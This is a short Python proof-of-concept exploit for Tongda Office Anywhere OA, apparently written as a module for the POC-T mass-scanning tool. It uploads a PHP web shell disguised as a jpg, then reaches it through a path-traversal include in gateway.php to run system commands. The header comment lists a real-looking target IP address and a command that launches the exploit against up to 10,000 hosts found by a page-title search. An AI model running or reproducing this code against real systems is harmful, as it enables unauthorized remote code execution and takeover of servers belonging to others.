#-*- coding: UTF-8 -*-
'''
	title="Office Anywhere"
http://60.2.179.245:8888/
nt authority\system

python2 POC-T.py -s tongdaOA_RCE_POCT -aF   "title=\"Office Anywhere\"" --limit 10000 -t 30


'''


 
import requests
import sys


def poc(url):
	host = url
	#print(host) #
	host = "http://" + host if  "http" not  in host else host

	upload_url = "%s/ispirit/im/upload.php" % host
	endfix = ["/ispirit/interface/gateway.php","/mac/gateway.php"]
	shell = '''<?php
	$command=$_POST['cmd'];
	$wsh = new COM('WScript.shell');
	$exec = $wsh->exec("cmd /c ".$command);
	$stdout = $exec->StdOut();
	$stroutput = $stdout->ReadAll();
	echo $stroutput;
	?>
	'''
	files = [ ('ATTACHMENT', ('jpg', shell, 'image/jpeg'))]

	upload_data={"P":"123","DEST_UID":"1","UPLOAD_MODE":"2"}
	try:
		upload_res = requests.post(upload_url,upload_data,files=files,proxies={"http":"127.0.0.1:8080"})
		path = upload_res.text
		path = path[path.find('@')+1:path.rfind('|')].replace("_","/").replace("|",".")

		# 由于上传文件会自动改为jpg，所以要用gateway.php包含
		include_data = {"json": "{\"url\":\"/general/../../attach/im/" + path +"\"}","cmd":"whoami"}
		for end in endfix:
			include_url = host + end
			include_res = requests.post(include_url, data=include_data,proxies={"http":"127.0.0.1:8080"})
			if  "No input file specified"  in include_res.text:
				continue
			else:
				return (url + ' | ' + include_res.text)

	except:
		return  False


#print(poc("http://60.2.179.245:8888/"))
